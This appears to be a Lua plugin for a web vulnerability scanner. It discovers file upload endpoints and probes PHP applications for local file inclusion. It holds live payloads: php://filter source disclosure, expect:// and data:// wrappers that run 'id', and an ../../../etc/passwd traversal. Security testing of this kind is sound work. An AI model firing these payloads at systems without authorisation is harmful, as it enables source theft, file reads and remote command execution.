-- file_upload_bypass.lua
-- Detects insecure file upload configurations
-- Mapped from: PortSwigger file upload labs, HTB Eldoria Panel (PHP wrapper bypass)
--
-- Tests:
--   1. Upload form discovery
--   2. Dangerous file extension acceptance check
--   3. .htaccess upload detection
--   4. PHP wrapper / LFI patterns

local base_url = TARGET:match("^(https?://[^/]+)")
if not base_url then return end

-- ── Phase 1: Discover upload endpoints ─────────────────────────────────────

local upload_paths = {
    "/upload", "/api/upload", "/file/upload", "/api/files",
    "/api/v1/upload", "/media/upload", "/image/upload",
    "/avatar", "/api/avatar", "/profile/photo",
    "/admin/upload", "/cms/upload", "/editor/upload",
}

local resp = http.get(TARGET)
if not resp then return end

-- Check main page for file upload forms
local has_upload_form = false
if resp.body then
    has_upload_form = resp.body:lower():find('type="file"') or
                      resp.body:lower():find("type='file'") or
                      resp.body:lower():find('enctype="multipart/form%-data"')
end

if has_upload_form then
    report.finding("info", "custom", "File Upload Form Detected",
        "Page contains a file upload form. Test for unrestricted file upload vulnerabilities.",
        TARGET)
end

-- ── Phase 2: Check upload endpoints for method acceptance ──────────────────

for _, path in ipairs(upload_paths) do
    local url = base_url .. path
    local check = http.get(url)
    if check and check.status ~= 404 and check.status < 500 then
        -- Endpoint exists — report for manual testing
        report.finding("info", "custom", "Upload Endpoint Found: " .. path,
            "File upload endpoint discovered at " .. url .. ". " ..
            "Test for: unrestricted extensions, content-type bypass, path traversal in filename.",
            url)
    end
end

-- ── Phase 3: PHP Wrapper / LFI detection ───────────────────────────────────
-- Mapped from: PortSwigger path traversal labs, HTB Eldoria Panel (ftp:// wrapper)

local lfi_params = {"file", "page", "path", "template", "include", "view", "lang", "doc", "load"}
local lfi_payloads = {
    -- PHP filter wrapper (read source as base64)
    {payload = "php://filter/convert.base64-encode/resource=index", sig = "PD9waH", desc = "PHP filter wrapper (base64 source read)"},
    -- PHP expect wrapper (RCE)
    {payload = "expect://id", sig = "uid=", desc = "PHP expect:// wrapper (RCE)"},
    -- PHP data wrapper
    {payload = "data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==", sig = "uid=", desc = "PHP data:// wrapper (RCE)"},
    -- PHP input wrapper marker
    {payload = "php://input", sig = "", desc = "PHP input:// wrapper detected"},
}

-- Test on existing parameters
if TARGET:find("?") then
    for param in TARGET:gmatch("[?&]([^=]+)=") do
        -- Check if this looks like a file/page parameter
        local param_lower = param:lower()
        local is_file_param = false
        for _, fp in ipairs(lfi_params) do
            if param_lower:find(fp) then
                is_file_param = true
                break
            end
        end

        if is_file_param then
            for _, lfi in ipairs(lfi_payloads) do
                local test_url = TARGET:gsub(
                    "([?&]" .. param .. "=)[^&]*",
                    "%1" .. lfi.payload
                )
                if test_url ~= TARGET then
                    local r = http.get(test_url)
                    if r and r.body then
                        if lfi.sig ~= "" and r.body:find(lfi.sig, 1, true) then
                            report.finding("critical", "custom",
                                "LFI via " .. lfi.desc .. " (param: " .. param .. ")",
                                "PHP wrapper injection successful via parameter '" .. param ..
                                "'. Payload: " .. lfi.payload,
                                test_url)
                            return
                        end
                        -- Check for PHP source code leak (base64 output)
                        if lfi.payload:find("base64") and r.body:find("PD9waH") then
                            report.finding("high", "custom",
                                "PHP Source Code Leak via php://filter",
                                "PHP source code extracted as base64 via php://filter wrapper. " ..
                                "Parameter: " .. param,
                                test_url)
                            return
                        end
                    end
                end
            end
        end
    end
end

-- ── Phase 4: Probe LFI on paramless URLs ───────────────────────────────────

local target_base = TARGET:match("^([^?]+)")
for _, param in ipairs(lfi_params) do
    -- PHP filter wrapper probe
    local test_url = target_base .. "?" .. param .. "=php://filter/convert.base64-encode/resource=index"
    local r = http.get(test_url)
    if r and r.body and r.body:find("PD9waH") then
        report.finding("high", "custom",
            "PHP Source Leak via php://filter (param: " .. param .. ")",
            "Discovered LFI via php://filter on probed parameter '" .. param .. "'.",
            test_url)
        return
    end

    -- Basic LFI probe
    test_url = target_base .. "?" .. param .. "=../../../etc/passwd"
    r = http.get(test_url)
    if r and r.body and r.body:find("root:x:0:0") then
        report.finding("high", "traversal",
            "Path Traversal via discovered parameter '" .. param .. "'",
            "LFI confirmed on probed parameter '" .. param .. "'.",
            test_url)
        return
    end
end
